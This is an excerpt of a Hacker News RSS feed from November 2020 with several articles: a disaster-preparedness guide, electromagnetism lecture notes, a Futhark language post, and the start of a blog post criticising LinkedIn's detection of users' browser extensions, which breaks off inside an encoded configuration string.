<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/">https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/</a></em></p>]]>
            </description>
            <link>https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060456</guid>
            <pubDate>Wed, 11 Nov 2020 17:29:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Doomsday prepping – Disaster planning for less crazy folk (2016)]]>
            </title>
            <description>
<![CDATA[
Score 170 | Comments 115 (<a href="https://news.ycombinator.com/item?id=25060418">thread link</a>) | @VBprogrammer
<br/>
November 11, 2020 | https://lcamtuf.coredump.cx/prep/ | <a href="https://web.archive.org/web/*/https://lcamtuf.coredump.cx/prep/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

 

<a name="1"></a>
<h2>1. Introduction <span>[<a href="#1">link</a>]</span></h2>

<p>
The prepper culture begs to be taken with a grain of salt. In a sense, it has
all the makings of a doomsday cult: a tribe of unkempt misfits who hoard gold
bullion, study herbalism, and preach about the imminent collapse of our society.
</p>

<p>
Today, we see such worries as absurd. It's not that life-altering disasters are
rare: every year, we hear about millions of people displaced by wildfires, earthquakes,
hurricanes, or floods. Heck, not a decade goes by without at least one first-class
democracy lapsing into armed conflict or fiscal disarray. But having grown up in a period
of unprecedented prosperity and calm, we take our way of life for granted - and find
it difficult to believe that an episode of bad weather or a currency crisis could
upend our lives for good.
</p>

<p>
I suspect that we dismiss such hazards not only because they seem surreal, but also because
worrying about them makes us feel helpless and lost. What's more, we follow the same instincts
to tune out far more pedestrian and avoidable risks; for example, 
most of us don't plan ahead for losing a job, for dealing with a week-long water outage, or
for surviving the night if our home goes up in smoke.
</p>

<p>
For many, the singular strategy for dealing with such dangers is to pray for the
government to bail us out. But no matter if our elected officials prefer to school us with
passages from
<a href="https://smile.amazon.com/dp/0156334607">Milton
Friedman</a> or from
<a href="https://smile.amazon.com/dp/0486477487" title="I'm sorry... I'm really sorry!">Thomas
Piketty</a>, the hard truth is that no state can provide a robust safety net for all
of life's likely contingencies; in most places, government-run social programs are severely deficient in funding, in
efficiency, and in scope. Large-scale disasters pit us against even worse odds; from New Orleans in 2005 to
Fukushima in 2011, there are countless stories of people left behind due to political dysfunction, poorly
allocated resources, or lost paperwork.
</p>

<p>
And so, the purpose of this guide is to combat the mindset of learned helplessness by
promoting simple, level-headed, personal preparedness techniques that are easy to
implement, don't cost much, and will probably help you cope with whatever life throws your way.
</p>

<p>
Oh, one thing: in contrast to most other docs of its kind, this page an
unadulterated labor of love; there are no affiliate links, paid product placements, or ads anywhere in the guide.
</p>

<a name="2"></a>
<h2>2. Mapping out the unknown <span>[<a href="#2">link</a>]</span></h2>

<p>
Effective preparedness can be simple, but it has to be rooted in an honest and
systematic review of the risks you are likely to face. Plenty of excited newcomers begin
by shopping for ballistic vests and night vision goggles; they would be better
served by grabbing a fire extinguisher, some bottled water, and then putting the rest of
their money in a rainy-day fund.
</p>

<p>
To maintain sanity while trying to enumerate risks, I found that it's best to focus on
broad outcomes instead of trying to track down every single way for things to go south.
Say, it should not matter if you are laid off because of a downsizing, because
your new boss hates you, or because they finally catch you stealing paperclips. The
outcome is the same: you are out of a job and urgently need a way to pay your bills.
</p>

<p>
Another insidious distraction is the desire to immediately figure out how to respond to all the scenarios
we end up dreaming of. Let's save that for later; by prematurely focusing on the second half of the
problem, we may end up glossing over some of the less tractable scenarios - or make
haphazard assumptions that will cloud our judgment in other ways.
</p>

<p>
I also found that to come up with a rational threat model, we need to think of "risk" as a product of
both the probability and the consequences of a given event. By that metric, stubbed toes
and zombie outbreaks are equally uninteresting; one of them has nearly zero significance,
the other, nearly zero odds.
</p>

<p>
What else? Ah, right: the final piece of advice I have is to keep things uncomplicated. There are
popular doomsday predictions that deal with cutting-edge particle physics, god-like computer
hackers, vast government conspiracies, or extraterrestrial messages hidden in pop songs. I suppose
we can't <i>really</i> rule that stuff out, but historical data suggests that there's a lot more
merit in worrying about falling off a ladder or getting hit by a car.
</p>

<p>
All right! With these caveats in mind, let's go over some canonical scenarios that are worth thinking about.
</p>

<a name="2.1"></a>
<h3>2.1. Problem space #1: Small-scale events <span>[<a href="#2.1">link</a>]</span></h3>

<p>
It's always fun to speculate about solar flares and supervolcanoes; it's far more mind-numbing to
seriously evaluate the consequences of backed up sewage or burst water mains. But in reality,
such unglamorous, small-scale incidents are far more likely to disrupt and reshape our
lives.
</p>

<p>
Broadly speaking, disastrous outcomes of such humdrum contingencies can be divided into
several groups:
</p>

<ul>

<li>
<p>
<b>Insolvency.</b>
  If a person over the age of 40 tells you that they have never lost a job, they are
  pretty lucky (or lying). Yet, the risk is seldom taken seriously; many middle-class,
  single-income families would be in deep trouble if it ever took them more than 2-3 months
  to find a new, equally well-paying gig.
</p>

</li><li>
<p>
<b>Disrupted access to water, food, energy, or transportation.</b>
  Substantial and prolonged outages happen everywhere; many of us will experience
  at least one at some point in our lives. A week without electricity may be just
  inconvenient and scary, especially in a high-rise or
  in a seedy neighborhood; but even a single hot day without potable water is really
  bad news.
</p>

</li><li>
<p>
<b>Loss of shelter.</b>
  Every year, there are over 350,000 house fires in the United States. Such accidents
  usually aren't deadly - but if you are unlucky, they can leave you stranded in the middle
  of the night in your PJs, with no documents or credit cards in hand.
</p>

</li><li>
<p>
<b>Unintentional injury.</b>
  Largely preventable and predictable incidents - such as falls, vehicle collisions, and poisonings -
  account for some 40 million ER visits annually. And lest you say people are simply too
  quick to rush to the hospital, said incidents also result in about 100,000 US
  deaths every year.
</p>

</li><li>
<p>
<b>Intentionally inflicted harm.</b>
  Violent crime is essentially <i>normal</i> almost everywhere in the world.
  In the US in the 90s, your lifetime likelihood of victimization was
  estimated to be around 80%; the odds of suffering criminal injury hovered at 40%. More recent
  research is hard to come by - but rest assured, life-threatening encounters remain a very real risk.
</p>

</li><li>
<p>
<b>Debilitating illness or death.</b>
  It's going to get you; maybe next week, maybe in 50 years. We can't really predict the day,
  but we can understand and meaningfully manage the impact it will have on those who depend on us -
  say, our stay-at-home partners or young kids.
</p>

</li></ul>

<p>
All in all, the risks discussed in this section have three defining characteristics: they are relatively
likely to happen; are strikingly easy to mitigate (we'll get into that soon); and tend to be so
unglamorous that they seldom make the cut in any "serious" guide to emergency preparedness.
</p>

<a name="2.2"></a>
<h3>2.2. Problem space #2: Mass calamities <span>[<a href="#2.2">link</a>]</span></h3>

<p>
If an errant backhoe took out the utilities for your block, you would probably head to the
grocery store to pick up bottled water (and use their restrooms, too). But if a
once-in-a-century storm damaged major roads and left half the city without running water, your
options wouldn't be as clear-cut.
</p>


<p>
That's why we have to look at larger-scale emergencies through somewhat different lens, taking into
account their likely magnitude, duration, and the nature of the forces at play. Some of the
plausible scenarios to think about include:
</p>

<ul>

<li>
<p>
<b>Natural disasters.</b>
  Common examples include floods, hurricanes, earthquakes, wildfires, and heatwaves. In some
  regions, such events are very rare; in others, they are almost guaranteed every decade or two.
</p>

</li><li>
<p>
<b>Industrial accidents.</b>
  Many people live in the proximity of heavy industries - say, refineries, freight railroads, or power plants.
  Depending on the type of industrial facilities nearby, you may want to evaluate the potential
  consequences of upwind and upstream explosions or chemical spills.
</p>

</li><li>
<p>
<b>Social unrest.</b>
  Riots are a distinct risk in many urban and suburban areas around the world. When angry mobs
  take it to the streets, widespread arson and violent crime are not unheard of, sometimes going
  on for days or weeks.
</p>

</li><li>
<p>
<b>Economic crises.</b>
  All highly developed countries go through cyclic recessions and periods of high unemployment;
  the US had about ten big ones in the past 100 years alone. Sometimes, such events
  are accompanied by bank runs and collapses of financial institutions; other times,
  they involve hyperinflation, product rationing, and currency controls.
</p>

</li><li>
<p>
<b>Pandemic.</b>
  It's been a while since the highly developed world experienced a devastating outbreak, but it
  may be premature to flat out dismiss the risk. In 1918, an unusual strain of flu managed to kill 75
  million people. Few years later, a mysterious sleeping sickness - probably also of viral origin -
  swept the globe, crippling millions, some for life. We aren't necessarily better prepared
  for similar events today.
</p>

</li><li>
<p>
<b>Terrorism or conventional war.</b>
  We think we would see it coming - but history shows that such events tend to catch nations
  off guard. These phenomena are noteworthy not only because of their immediate death toll,
  which can be relatively low - but because of the far-reaching and long-term socioeconomic
  disruption they can cause.
</p>

</li></ul>

<p>
Most of us will probably not get tangled up in a large-scale disaster of any sort, but it
is only wise to hedge your bets. There are countless examples to demonstrate that such events
happen often and can strike close to home - say:
</p>

<ul>

<li>
<p>
The EU debt crisis, from 2009 onward. A series of events that led to staggering unemployment rates
in Greece, deposit confiscations in Cyprus, and uncertain prospects for the entire
eurozone.
</p></li></ul></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lcamtuf.coredump.cx/prep/">https://lcamtuf.coredump.cx/prep/</a></em></p>]]>
            </description>
            <link>https://lcamtuf.coredump.cx/prep/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060418</guid>
            <pubDate>Wed, 11 Nov 2020 17:26:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advance Electromagnetism Notes (Site)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060248">thread link</a>) | @E-Reverance
<br/>
November 11, 2020 | https://andrealommen.github.io/PHY309/lectures | <a href="https://web.archive.org/web/*/https://andrealommen.github.io/PHY309/lectures">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article>

  

  <div>
    <h3 id="for-reference">For reference</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/derivatives">All the Fundamental Theorems Together</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/maxwell">Maxwell’s Equations</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/minus_signs">Minus Signs</a><br></p>
<h3 id="chapter-1-vector-analysis">Chapter 1: Vector Analysis</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/grad">Gradients Theorem</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/div">Divergence Theorem</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/curl">Stokes’ Theorem (Curl)</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/dirac">Dirac Delta Function</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/potentials">Potentials and Boundary Conditions</a><br></p>
<h3 id="chapter-2-electrostatics">Chapter 2: Electrostatics</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt2">Andrea’s Crash Course in Chapter 2</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/electric">Electric Field</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/divcurlE">Divergence and Curl of Electric Field, Gauss’s Law</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/PotentialWorkEnergy">Potential, Work, Energy</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/conductors">Boundary Conditions and Conductors</a><br></p>
<h3 id="chapter-3-potentials">Chapter 3: Potentials</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt3">Andrea’s Crash Course in Chapter 3</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/laplace">Laplace’s Equation and the Method of Images</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/separation">Separation of Variables</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/multipole">Multipole Expansion </a><br></p>
<h3 id="chapter-4-electric-fields-in-matter">Chapter 4: Electric Fields in Matter</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt4">Andrea’s Crash Course in Chapter 4</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/polarization">Polarization</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/debrief">Debrief HW3</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/displacement">Displacement</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/boundaryD">Boundary Values in the Presence of a Dielectric</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/SolutionToInClassDielectricCylinderProblem.pdf">Full solution to the Dielectric Cylinder Problem</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/final_words_displacement">Final Words (Rant?) on Displacement</a><br></p>
<h3 id="one-third-of-the-way-through-the-course-we-reflect">One-third of the way through the course, we reflect…</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/CumulativeSummary1">Summary of Course so Far</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/Survey.html">Survey Results</a><br></p>
<h3 id="first-exam">First Exam</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/firstexamformat">What will be the format of the 1st exam?</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/practice_problems_1st">Practice Problems for 1st exam</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/firstexam">First Exam</a><br></p>
<h3 id="chapter-5-magnetostatics">Chapter 5: Magnetostatics</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt5">Andrea’s Crash Course in Chapter 5</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/lorentz">Lorentz and Biot-Savart</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/ampere">Ampere’s Law and the Vector Potential</a><br></p>
<h3 id="chapter-6-magnetic-fields-in-matter">Chapter 6: Magnetic Fields in Matter</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/chapt6">Andrea’s Crash Course in Chapter 6</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/magnetized_matter">Magnetization and the Field of a Magnetized Object</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/auxiliary">The Auxiliary Field</a><br></p>
<h3 id="chapter-7-electrodynamics">Chapter 7: Electrodynamics</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/allChapt7">Andrea’s Crash Course in Chapter 7</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/induction">Electromotive Force and Induction</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/maxwellChapt7">Maxwell’s Equations</a><br></p>
<h3 id="chapter-8-griffiths-calls-it-conservation-laws-at-this-point-we-only-picked-up-the-continuity-equation-and-saved-the-rest-for-after-chapter-9">Chapter 8: Griffiths calls it Conservation laws, at this point we only picked up the Continuity Equation and saved the rest for after Chapter 9</h3>
<p>(We’re kind of picking up Chapter 8 along the way…)<br>
<a href="https://andrealommen.github.io/PHY309/lectures/allChapt8">Andrea’s Crash Course in Chapter 8</a><br></p>
<h3 id="chapter-9-electromagnetic-waves">Chapter 9: Electromagnetic Waves</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/allChapt9">Andrea’s Crash Course in Chapter 9</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/light">Light!!!!!</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/polarization">Polarization of Waves in Linear and Conducting Media</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/reflection">Boundary Conditions, Reflection and Transmission</a><br></p>
<h3 id="second-exam">Second Exam</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/secondexamreview">Review for the second exam</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/secondexamformat">What will be the format of the 2nd exam?</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/practice_problems_2nd">Practice Problems for 2nd exam</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/secondexam">Second Exam</a><br></p>
<h3 id="poynting-vector-energy-transmission-coefficient-parts-of-chapters-8-and-9">Poynting Vector, Energy, Transmission coefficient (parts of chapters 8 and 9)</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/quarterwaveplate">In a quarter wave plate, can we really assume the transmission coefficients are the same?</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/poynting">Poynting Theorem, Poynting Vector, Energy, Momentum</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/transmission">Poynting Theorem in EM Waves, Transmission and Reflection Coefficients</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/plasma">Waves in a Tenuous Plasma, Dispersion</a> <br></p>
<h3 id="chapter-10-potentials-and-fields">Chapter 10: Potentials and Fields</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/Chapt10ReviewPlusTensors">Andrea’s Crash Course in Chapter 10</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/potentialformulation">The Potential Formulation</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/deferred">The Deferred Potential</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/leinard">Leinard-Wiechert Potential</a> <br></p>
<h3 id="chapter-11-radiation">Chapter 11: Radiation</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/allChapt11">Andrea’s Crash Course in Chapter 11</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/radiation">Radiation</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/dipole">Dipole Radiation</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/point">Radiation from a Point Charge</a> <br></p>
<h3 id="the-final-week-looking-backwards-and-forwards">The Final Week: Looking backwards and forwards</h3>
<p><a href="https://andrealommen.github.io/PHY309/lectures/Chapt10ReviewPlusTensors">Chapter 10 Review (emphasis Gauge and Deferred) Plus Relativity, Chapt 12</a><br>
<a href="https://andrealommen.github.io/PHY309/lectures/Chapt10ReviewPt2">Chapter 10 Review cont’d including Deferred Potential</a> <br>
<a href="https://andrealommen.github.io/PHY309/lectures/allChapt11">Pancake breakfast party, and Review Chapter 11.  We’ll do a questionnaire here to get your thoughts about the class</a></p>
<h3 id="the-final-exam">The Final Exam</h3>
<p>You may look at the following whenever you want.  It explains the format of the exam and what kind of problems
to expect.
<a href="https://andrealommen.github.io/PHY309/lectures/finalexamformat">Format of the Final Exam</a><br></p>

<p>When you’re ready to take the exam please click <a href="https://andrealommen.github.io/PHY309/lectures/finalexam">here.</a></p>

  </div>


</article>


      </div>
    </div></div>]]>
            </description>
            <link>https://andrealommen.github.io/PHY309/lectures</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060248</guid>
            <pubDate>Wed, 11 Nov 2020 17:11:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Will Futhark Work on Apple Silicon?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060172">thread link</a>) | @Athas
<br/>
November 11, 2020 | https://futhark-lang.org/blog/2020-11-11-will-futhark-work-on-apple-silicon.html | <a href="https://web.archive.org/web/*/https://futhark-lang.org/blog/2020-11-11-will-futhark-work-on-apple-silicon.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      

<p>
    Posted on November 11, 2020
    
        by Troels Henriksen
    
</p>

<p>Apple is coming out with computers that are basically ARM64, <a href="https://en.wikipedia.org/wiki/Think_different">but with a different ABI than existing ARM64 for some reason</a>. They call the architecture <a href="https://en.wikipedia.org/wiki/Mac_transition_to_Apple_Silicon">Apple Silicon</a>, which is a wonderful term that will undoubtedly never become dated or insufficiently precise.</p>
<p>Anyway, you see various posts such <a href="https://developer.r-project.org/Blog/public/2020/11/02/will-r-work-on-apple-silicon/">Will R Work on Apple Silicon?</a> where language developers answer whether their language will work on these new machines. Since these machines will support transparent emulation of x86, the simple answer is <em>yes</em>. Apple’s emulation was quite good during the PPC-to-x86 transition, so this is trustworthy. Of course, emulation is never going to be as fast as native compilation. For R, the problem is that they depend on some Fortran code, and there is <a href="https://developer.apple.com/forums/thread/651476">not yet a Fortran compiler available for Apple Silicon</a>.</p>
<p>Well, I can confirm that Futhark depends on absolutely no Fortran. Futhark compiles to C (or Python), and does not care about the specific target architecture. Therefore, Futhark programs should run fine on Apple Silicon. The bigger problem is that <a href="https://www.extremetech.com/computing/270902-apple-defends-killing-opengl-opencl-as-developers-threaten-revolt">Apple has deprecated OpenCL</a>, and <a href="https://www.provideocoalition.com/officially-official-nvidia-drops-cuda-support-for-macos/">does not support CUDA at all</a> due to being grumpy with NVIDIA, so there may eventually be no way to run Futhark <em>on a GPU</em> on macOS. It is unlikely that we will find the time to add a backend for Apple’s <a href="https://developer.apple.com/metal/">proprietary Metal API</a> that is supported <em>absolutely nowhere else</em>, but it’s possible that we’ll finish Futhark’s embryonic Vulkan backend. While macOS does not come bundled with Vulkan, <a href="https://github.com/KhronosGroup/MoltenVK">even Apple probably cannot hold back this eruption</a>.</p>
<p>And of course, the Futhark multi-core backend should run well on any Unix-like system.</p>


    </div></div>]]>
            </description>
            <link>https://futhark-lang.org/blog/2020-11-11-will-futhark-work-on-apple-silicon.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060172</guid>
            <pubDate>Wed, 11 Nov 2020 17:04:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Minimal 3D creative coding tool – control 8×8×8 dots with JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25060146">thread link</a>) | @doersino
<br/>
November 11, 2020 | https://doersino.github.io/tixyz/ | <a href="https://web.archive.org/web/*/https://doersino.github.io/tixyz/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://doersino.github.io/tixyz/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060146</guid>
            <pubDate>Wed, 11 Nov 2020 17:02:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A look at how LinkedIn exfiltrates extension data from their users (2020)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060089">thread link</a>) | @coreyprophitt
<br/>
November 11, 2020 | https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users | <a href="https://web.archive.org/web/*/https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <div>
          <p><img src="https://prophitt.me/assets/images/posts/linkedins-gambit.svg" width="300" height="300"></p><div>
            
            <p><time datetime="2020/11/05T00:00:00Z">Published on November 5th, 2020</time>
          </p></div>
        </div>

        <p><span>Â·</span><span>Â·</span><span>Â·</span></p>

        <h2>What did I find?</h2>
        <p>
          LinkedIn is actively spraying their users' browser with web requests and dom queries in an attempt to determine
          if certain browser extensions are installed. The data is then exfiltrated back to LinkedIn.
        </p>
        <p>
          It is not clear what the data is used for or how it is used by LinkedIn. However, it is clear LinkedIn is
          targeting certain sales and recruiting tools. It is also common knowledge in the sales and recruiting
          communities that LinkedIn restricts or outright bans accounts based on the use of unapproved tools.
        </p>
        <p>
          LinkedIn is within their right to detect malicious user behavior and take action. However, the means they are
          employing are problematic for a number of reasons:
          </p><ol>
            <li>
              LinkedIn doesn't verify you are actually using the extension, they only check if the extension is currently
              installed and/or enabled.
            </li>
            <li>
              A number of the tools LinkedIn does not allow have legitimate uses and can be used on public web pages.
            </li>
            <li>
              The exfiltrated data could be further used for nefarious things such as browser finger printing.
            </li>
          </ol>
        

        <p>
          Furthermore, the methods employed by LinkedIn to detect extensions take advantage of developer oversights and
          browser extension limitations. This comes across as shady to me.
        </p>

        <h2>Unraveling the Mystery</h2>
        <p>
          I was initially turned on to LinkedIn's data exfiltration when I noticed a large number of failed web requests while visiting
          a LinkedIn profile. Initially, I thought my adblocker was blocking network requests. However, upon a closer look I noticed the
          web requests were not being sent across the web. They were actually being sent locally, to the browser itself. This can be
          seen clearly when viewing the network request's path. The paths were all being made using Chrome's own extension protocol. All
          requests began with <strong>chrome-extension://</strong>.
        </p>
        <p>
          For the uninitiated, the Chrome extension protocol is used to make web requests directly to an installed browser extension.
          Typically, this is used by the extension itself to retrieve resources or assets. However, any resources listed in an extension's
          manifest under the <strong>"web_accessible_resources"</strong> key are available to all web page contexts. Ironically, this
          section of the manifest was designed to minimize browser fingerprinting and protect the privacy of the extension user. Here's
          an excerpt directly from <a target="_blank" rel="noopener noreferrer" href="https://developer.chrome.com/extensions/manifest/web_accessible_resources">
          Google's own documentation</a> regarding the web accessible resources:
        </p>

        <blockquote>
         Prior to manifest version 2 all resources within an extension could be accessed from any page on the web. This allowed a malicious website to fingerprint the extensions that a user has installed or exploit vulnerabilities (for example XSS bugs) within installed extensions. Limiting availability to only resources which are explicitly intended to be web accessible serves to both minimize the available attack surface and protect the privacy of users.
        </blockquote>

        <p>
         Unfortunately, Google's changes only minimized the attack surface and did not prevent browser fingerprinting or privacy violations.
         It is this very issue that is leveraged by LinkedIn to identify installed extensions.
        </p>

        <p>
          My curiosity got the best of me and I set out to learn more about how LinkedIn was performing the scan and what they were doing
          with the data.
        </p>

        <h2>Eeny, Meeny, Miny, Moe</h2>
        <p>
          The sheer number of Chrome extension web requests performed by LinkedIn were staggering. I began to wonder how they were storing
          all of the extension information in order to make those web requests. The hunt began.
        </p>
        <p>
          Initially, I jotted down a few of the unique extension ids in hopes of finding references to them. I looked for any reference
          to the ids within LinkedIn's web responses but I had no luck. I looked within LinkedIn's web resources and code, but again I had no
          luck. Another idea crossed my mind; <i>Maybe they were hiding the extension information in their cookies or local storage?</i>
        </p>
        <p>
          My hunch led me to LinkedIn's local storage and a curious key, <strong>C_C_M</strong>. The value for the key was a large,
          seemingly random set of characters seen below:
        </p><pre><code>eyJcdTAwNDNcdTAwNmZcdTAwNmVcdTAwNjZcdTAwNjlcdTAwNjciOnsiXHUwMDYxXHUwMDc1XHUwMDc0XHUwMDZmXHUwMDU1XHUwMDcwXHUwMDY0XHUwMDYxXHUwMDc0XHUwMDY1Ijp0cnVlLCJcdTAwNjFcdTAwNzVcdTAwNzRcdTAwNmZcdTAwNDVcdTAwNzhcdTAwNjVcdTAwNjNcdTAwNzVcdTAwNzRcdTAwNjUiOnRydWUsIlx1MDA2NVx1MDA3OFx1MDA2NVx1MDA2M1x1MDA3NVx1MDA3NFx1MDA2NVx1MDA0OVx1MDA2ZVx1MDA3NFx1MDA2NVx1MDA3Mlx1MDA3Nlx1MDA2MVx1MDA2YyI6MTgwMDAwMCwiXHUwMDY1XHUwMDZlXHUwMDYxXHUwMDYyXHUwMDZjXHUwMDY1Ijp0cnVlLCJcdTAwNjVcdTAwNzhcdTAwNjVcdTAwNjNcdTAwNzVcdTAwNzRcdTAwNjUiOmZhbHNlLCJcdTAwNjRcdTAwNmZcdTAwNmRcdTAwNTNcdTAwNjNcdTAwNjFcdTAwNmUiOnRydWUsIlx1MDA2NFx1MDA2Zlx1MDA2ZFx1MDA1M1x1MDA2M1x1MDA2MVx1MDA2ZVx1MDA1NFx1MDA2OVx1MDA2ZFx1MDA2NVx1MDA2Zlx1MDA3NVx1MDA3NCI6MTAwLCJcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjhcdTAwNTNcdTAwNjNcdTAwNjFcdTAwNmUiOnRydWUsIlx1MDA3MFx1MDA2MVx1MDA3NFx1MDA2OFx1MDA1M1x1MDA2M1x1MDA2MVx1MDA2ZVx1MDA1NFx1MDA2OVx1MDA2ZFx1MDA2NVx1MDA2Zlx1MDA3NVx1MDA3NCI6MTAwLCJcdTAwNjlcdTAwNmVcdTAwNjlcdTAwNzQiOjIyMjAwMDB9LCJcdTAwNGRcdTAwNjVcdTAwNzRcdTAwNjFcdTAwNjRcdTAwNjFcdTAwNzRcdTAwNjEiOnsiXHUwMDY1XHUwMDc4XHUwMDc0IjpbeyJcdTAwNmVcdTAwNjFcdTAwNmRcdTAwNjUiOiJcdTAwNmFcdTAwNGZcdTAwNjRcdTAwNjZcdTAwNDNcdTAwNjFcdTAwNTdcdTAwNDhcdTAwNzkiLCJcdTAwNjlcdTAwNmVcdTAwNzRcdTAwNjVcdTAwNzJcdTAwNzZcdTAwNjFcdTAwNmMiOjM2MDAwMDAsIlx1MDA2NFx1MDA2MVx1MDA3NFx1MDA2NSI6MCwiXHUwMDc0XHUwMDZmXHUwMDcwXHUwMDUwXHUwMDYxXHUwMDc0XHUwMDY4IjpbIlx1MDA3MFx1MDA3Mlx1MDA2Zlx1MDA2Nlx1MDA2OVx1MDA2Y1x1MDA2NSIsIlx1MDA3Mlx1MDA2NVx1MDA2M1x1MDA3Mlx1MDA3NVx1MDA2OVx1MDA3NFx1MDA2NVx1MDA3MiJdLCJcdTAwNjRcdTAwNmZcdTAwNmQiOnsiXHUwMDczXHUwMDY1XHUwMDZjXHUwMDY1XHUwMDYzXHUwMDc0XHUwMDZmXHUwMDcyIjpbIlx1MDAyZVx1MDA3M1x1MDA2MVx1MDA2Y1x1MDA2NVx1MDA3M1x1MDA2Y1x1MDA2Zlx1MDA2Nlx1MDA3NFx1MDAyZFx1MDA2Y1x1MDA2Zlx1MDA2N1x1MDA2ZiJdfSwiXHUwMDcwXHUwMDYxXHUwMDc0XHUwMDY4IjpbXX0seyJcdTAwNmVcdTAwNjFcdTAwNmRcdTAwNjUiOiJcdTAwNmFcdTAwNGZcdTAwNjRcdTAwNjZcdTAwNDNcdTAwNjFcdTAwNTdcdTAwNDhcdTAwNzlcdTAwNDlcdTAwNGZcdTAwNzZcdTAwNjZcdTAwNThcdTAwNDdcdTAwNjYiLCJcdTAwNjlcdTAwNmVcdTAwNzRcdTAwNjVcdTAwNzJcdTAwNzZcdTAwNjFcdTAwNmMiOjg2NDAwMDAwLCJcdTAwNjRcdTAwNjFcdTAwNzRcdTAwNjUiOjAsIlx1MDA3NFx1MDA2Zlx1MDA3MFx1MDA1MFx1MDA2MVx1MDA3NFx1MDA2OCI6WyJcdTAwNzBcdTAwNzJcdTAwNmZcdTAwNjZcdTAwNjlcdTAwNmNcdTAwNjUiLCJcdTAwNzJcdTAw